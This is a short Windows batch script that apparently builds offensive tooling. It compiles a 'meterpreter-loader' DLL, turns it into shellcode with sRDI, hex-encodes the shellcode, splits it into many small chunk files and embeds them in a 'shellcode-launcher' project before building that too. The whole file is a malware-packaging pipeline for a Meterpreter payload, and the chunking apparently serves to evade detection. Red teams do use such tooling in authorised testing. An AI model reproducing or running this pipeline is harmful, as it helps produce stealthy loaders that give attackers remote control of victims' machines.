@ echo off

set sRDI=%cd%\sRDI\Python\ConvertToShellcode.py
set RES_DIR=%cd%\shellcode-launcher\src\resources

pushd meterpreter-loader
call make.bat
popd

pushd meterpreter-loader\cmake-build-default\bin
python %sRDI% -f main libmain.dll && ^
xxd -p libmain.bin | ^
tr -d "\r\n" > payload.txt && ^
split -n 50 -e -d --additional-suffix=.txt payload.txt payload- && ^
mv -f payload-* %RES_DIR%
popd

pushd shellcode-launcher
call make.bat
popd
